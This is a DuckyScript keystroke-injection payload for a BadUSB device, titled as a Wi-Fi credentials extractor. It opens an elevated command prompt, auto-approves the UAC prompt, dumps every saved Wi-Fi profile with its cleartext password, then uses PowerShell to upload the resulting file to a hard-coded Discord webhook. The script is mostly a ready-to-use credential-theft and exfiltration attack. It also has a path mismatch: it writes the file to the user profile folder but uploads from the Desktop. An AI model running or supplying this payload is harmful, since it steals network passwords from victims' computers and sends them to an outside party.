REM Title: Wi-Fi Credentials Extractor
REM Description: Extracts Wi-Fi profiles and passwords using the Command Prompt.

DELAY 1000
REM Open Command Prompt
GUI r
DELAY 500
STRING cmd
DELAY 500
CTRL-SHIFT-ENTER
DELAY 1000
REM Approve UAC (if enabled)
ALT y
DELAY 1000

REM Save Wi-Fi profiles to a temporary file
STRING netsh wlan show profiles > "%USERPROFILE%\\wifi_profiles.txt"
ENTER
DELAY 1000

REM Loop through profiles and extract passwords
STRING for /F "tokens=4 delims=: " %A in ('findstr "All User Profile" "%USERPROFILE%\\wifi_profiles.txt"') do netsh wlan show profile name="%A" key=clear >> "%USERPROFILE%\\wifi_credentials.txt"
ENTER
DELAY 2000

REM Notify the user about the location of the saved credentials
STRING echo Wi-Fi credentials saved to %USERPROFILE%\wifi_credentials.txt
ENTER
DELAY 1000

REM Close the Command Prompt
STRING exit
ENTER


REM this is the send to discord code
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING $WebhookURL = "https://discordapp.com/api/webhooks/1344356517175885834/ibTbvZEbssm5lhu-iXueT8Hhb452moxmLHBIPdLbShd-p7k7vLR1CMMp_Em7-dHOwFdk"; 
STRING $FilePath = "$env:USERPROFILE\Desktop\wifi_credentials.txt"; 
STRING Add-Type -AssemblyName System.Net.Http; 
STRING if (Test-Path $FilePath) { 
STRING $MultipartContent = [System.Net.Http.MultipartFormDataContent]::new(); 
STRING $FileStream = [System.IO.File]::OpenRead($FilePath); 
STRING $FileContent = [System.Net.Http.StreamContent]::new($FileStream); 
STRING $MultipartContent.Add($FileContent, "file", "wifi_credentials.txt"); 
STRING $HttpClient = [System.Net.Http.HttpClient]::new(); 
STRING $HttpClient.PostAsync($WebhookURL, $MultipartContent) | Out-Null; 
STRING Write-Host "File sent successfully."; 
STRING } else { Write-Host "File not found"; }
ENTER
DELAY 1000
ALT F4
